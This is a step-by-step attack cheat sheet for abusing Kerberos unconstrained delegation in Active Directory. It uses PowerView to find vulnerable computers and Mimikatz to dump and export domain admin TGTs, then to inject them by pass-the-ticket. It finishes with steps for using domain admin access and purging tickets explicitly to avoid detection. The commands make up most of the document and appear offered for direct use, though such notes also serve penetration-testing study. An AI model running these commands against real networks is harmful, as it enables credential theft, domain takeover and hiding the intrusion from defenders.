# 🟢 Unconstrained Delegation

### **Discover domain computers that have unconstrained delegation**

Domain Controllers always show up, ignore them

```
 . .\PowerView_dev.ps1
Get-Netcomputer -UnConstrained
Get-Netcomputer -UnConstrained | select samaccountname
```

### **Check if any DA tokens are available on the unconstrained machine**

Wait for a domain admin to log in while checking for tokens

```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

### **Export the TGT ticket**

```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

### **Reuse the TGT ticket**

```
Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
```

**Confirm Success of Ticket Injection**

After importing the TGT ticket to the current session, check if it was successful:

```
klist
```

This command will list all tickets in the cache, and you should see the injected TGT.

**Access Resources with Elevated Privileges**

Now that you have a valid TGT of a domain administrator, you can access resources on the domain that require DA privileges.

```
net view /domain
```

This command will list all domains and servers that the user has access to in the network.

#### Clean up Traces

It's important to remove traces of the attack to avoid detection.

```
Invoke-Mimikatz -Command '"kerberos::purge"'
```

This command purges all Kerberos tickets from the cache, including the injected TGT ticket.
